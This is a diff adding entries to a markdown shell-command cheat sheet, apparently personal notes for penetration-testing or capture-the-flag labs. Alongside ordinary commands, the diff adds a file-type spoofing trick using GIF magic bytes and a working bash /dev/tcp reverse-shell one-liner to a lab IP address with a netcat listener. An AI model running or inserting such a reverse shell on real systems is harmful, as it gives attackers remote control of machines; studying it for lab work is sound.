@@ -12,6 +12,7 @@ mkdir -p a/b/c/d/e && cd $_  # create folder and switch to it
 $! shell variable            # the PID of the last executed command
 du -ch                       # estimate file space usage
 su -                         # switch to root user
+tar -xvf file.tar            # extract file
 ```
 
 
@@ -21,6 +22,18 @@ $ ifconfig                   # configure/view network interfaces
 $ ping -c 5 www.google.com   # ping 5 times
 $ arp                        # manipulate the system ARP cache
 ```
+
+
+### Magic bytes
+* https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/
+* Example: 
+ ```$ echo "GIF8;" > testfile.file```
+ ```$ file testfile.file```   # outputs  **testfile.file: GIF image data**
+
+
+### Bach reverse shell
+* https://github.com/fijimunkii/bash-dev-tcp/blob/master/reverse-shell
+* Example: ```bash -i >& /dev/tcp/10.10.14.150/9001 0>&1```   plus   ```nc -lvnp 9001``` to listen
 
 
 ### DNS configuration issues
